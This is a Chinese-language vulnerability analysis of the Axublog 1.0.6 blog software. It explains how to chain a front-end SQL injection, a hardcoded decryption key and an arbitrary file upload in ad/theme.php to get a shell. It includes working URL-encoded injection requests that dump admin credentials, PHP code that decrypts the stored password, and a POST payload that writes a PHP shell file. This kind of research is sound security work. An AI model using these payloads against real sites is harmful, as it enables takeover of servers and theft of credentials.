@@ -1,0 +1,30 @@
+0x00 背景
+看了cnvd上有师傅发了Axublog 的漏洞，便对该源码进行分析和漏洞复现，在漏洞复现过程发现可以将这些漏洞组合利用从而通过前台SQL注入与后台任意文件上传可以轻松获取GetShell，当然该源码还存在许多安全问题，本篇未涉及。
+源码下载地址：http://pic.axublog.com/axublog1.0.6install.rar
+0x01 前台SQL注入
+源码版本：Axublog axublog v1.0.6
+漏洞位置：hit.php
+漏洞链接：http://www.cnvd.org.cn/flaw/show/CNVD-2017-35761
+下载源码并进行安装，根据CNVD上的描述，存在漏洞的文件是ad/theme.php,打开目标文件进行审计，经过审计发现改文件还存在其他多个漏洞，本篇先不做分析。
+1. 根据CNVD上的描述，在hit.php文件中发现如下代码块，使用GET接收参数id的值并且直接传入到SQL语句进行拼接操作，且没有进行任何安全处理，所以存在SQL注入漏洞，在文件的第20行中将SQL语句的执行结果打印出来，因此是有回显的SQL注入。
+2. 此处是前台的页面，因此可以在前台直接访问该页面，进行SQL注入获取数据库中的敏感信息，首先需要满足if条件语句的要求，使用GET请求g参数的值为arthit，id参数的值不为空，进行如下请求后使用mysql监控工具，监测执行的SQL语句，确保传入的参数已经执行。
+3. 执行如下请求发现被拦截了，然后在文件的第4-5行发现sqlguolv方法。
+4. 跟入该方法在axublog1.0.6\class\c_other.php文件的第545-548行中发现了该方法的代码块。
+5. 该代码块使用$_SERVER['QUERY_STRING']获取查询语句，一般是问号后面的字符串，但是使用$_SERVER['QUERY_STRING']并不会对传入的字符进行一次URL解码操作，但是$_GET是会进行一次URL解码的，并且传入id值使用的是$_GET的方式接收，过滤的时候使用$_SERVER['QUERY_STRING']进行接收和处理，所以可以使用url编码绕过检测。
+获取管理员用户名。
+http://127.0.0.1/code/axublog1.0.6/hit.php?g=arthit&id=-1 +%55NION+ALL+%53ELECT+1,2,3,4,5,6,adnaa,8,9,10,11,12 from axublog_adusers
+获取管理员用户密码：
+http://127.0.0.1/code/axublog1.0.6/hit.php?g=arthit&id=-1 +%55NION+ALL+%53ELECT+1,2,3,4,5,6,adpss,8,9,10,11,12 from axublog_adusers
+6. 在分析的时候发现axublog1.0.6\ad\login.php的第88行中密码使用了authcode方法进行加密。
+7. 跟入authcode方法，在axublog1.0.6\class\c_md5.php文件的第16-62行中发现了该方法的代码块，将该加解密的方法抓取出来，然后结合axublog1.0.6\ad\login.php的第88行，可以知道加解密的字符串写成固定的值key，使用如下的方式获取从数据库中得到的管理员密码明文，然后便可以登录后台。
+1.<?php 2.function authcode($string, $operation = 'DECODE', $key = '', $expiry = 30) { 3\. $ckey_length = 0; 4.// 随机密钥长度 取值 0-32; 5.// 加入随机密钥，可以令密文无任何规律，即便是原文和密钥完全相同，加密结果也会每次不同，增大破解难度。 6.// 取值越大，密文变动规律越大，密文变化 = 16 的 $ckey_length 次方 7.// 当此值为 0 时，则不产生随机密钥 8\. $key = md5($key ? $key : EABAX::getAppInf('KEY')); 9\. $keya = md5(substr($key, 0, 16)); 10\. $keyb = md5(substr($key, 16, 16)); 11\. $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; 12\. $cryptkey = $keya.md5($keya.$keyc); 13\. $key_length = strlen($cryptkey); 14\. $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; 15\. $string_length = strlen($string); 16\. $result = ''; 17\. $box = range(0, 255); 18\. $rndkey = array(); 19\. for($i = 0; $i <= 255; $i++) { 20\. $rndkey[$i] = ord($cryptkey[$i % $key_length]); 21\. } 22\. for($j = $i = 0; $i < 256; $i++) { 23\. $j = ($j + $box[$i] + $rndkey[$i]) % 256; 24\. $tmp = $box[$i]; 25\. $box[$i] = $box[$j]; 26\. $box[$j] = $tmp; 27\. } 28\. for($a = $j = $i = 0; $i < $string_length; $i++) { 29\. $a = ($a + 1) % 256; 30\. $j = ($j + $box[$a]) % 256; 31\. $tmp = $box[$a]; 32\. $box[$a] = $box[$j]; 33\. $box[$j] = $tmp; 34\. $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); 35\. } 36\. if($operation == 'DECODE') { 37\. if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { 38\. return substr($result, 26); 39\. } else { 40\. return ''; 41\. } 42\. } else { 43\. return $keyc.str_replace('=', '', base64_encode($result)); 44\. } 45.} 46. 47.$psw='yYxvHseLMURYWjMXuICtH2jsBTQNdXog43es9PZUng'; 48.echo authcode(@$psw, 'DECODE', 'key',0) 49. 50.?>
+0x02 任意文件上传漏洞
+源码版本：Axublog axublog v1.0.6
+漏洞位置：ad/theme.php
+漏洞链接：http://www.cnvd.org.cn/flaw/show/CNVD-2017-36013
+1. 在ad/theme.php文件中的第185-205行中发现edit2save方法中的如下代码块，是进行文件的报存操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。
+2. 追溯寻找edit2save方法被调用的位置，在文件ad/theme.php中的第10-25行中发现如下代码，当GET传入的g参数的值为edit2save时候便会调用edit2save方法。
+3. 但是由于该文件需要登录到后台访问，所以有一定的限制，但是与前台SQL注入漏洞利用便可以使用管理员账号登录，进行如下请求可以对该漏洞进行验证；使用GET传入g=edit2save,使用POST传入path=./evil_shell.php&content=<?php phpinfo();?>
+然后再访问http://127.0.0.1/code/axublog1.0.6/ad/evil_shell.php，便可以访问到上传的恶意文件。
+0x03 总结
+本篇涉及Axublog的3个主要问题:1.前台SQL过滤可以被绕过，2. 加密的key默认是固定的，3. 后台存在任意文件上传，因此利用这3个问题便可以前台GetShell，最后感谢师傅们的指导，期待和师傅们的各种交流。
